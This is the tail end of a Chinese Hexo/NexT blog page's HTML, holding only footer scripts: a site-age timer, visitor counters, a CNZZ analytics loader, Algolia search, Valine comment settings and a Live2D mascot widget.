    seconds=setzero(Math.floor((e_minsold-minsold)*60));
    document.getElementById('days').innerHTML="已在此等候你"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
}
function setzero(i){
    if (i<10)
    {i="0" + i};
    return i;
}
show_date_time();
</script>

<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
  <span class="site-uv" title="总访客量">
    总访客量：<span id="busuanzi_value_site_uv"></span>
  </span>
    <span class="post-meta-divider">|</span>
  <span class="site-pv" title="总访问量">
    总访问量：<span id="busuanzi_value_site_pv"></span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>
<div>
<script type="text/javascript">
document.write(unescape("%3Cspan id='cnzz_stat_icon_1279770196'%3E%3C/span%3E%3Cscript src='https://s4.cnzz.com/z_stat.php%3Fid%3D1279770196%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));
</script>
</div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  

<script src="//cdn.jsdelivr.net/npm/algoliasearch@4.8.2/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4.8.7/dist/instantsearch.production.min.js"></script><script src="/js/algolia-search.js"></script>






  


<script>
NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}, {
      el: '#valine-comments',
      path: "/2019/04/16/pegasus%E5%88%86%E6%9E%90/",
      serverURLs: "https://3ugsbmnv.api.lncldglobal.com"
    }));
  }, window.Valine);
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
</html>
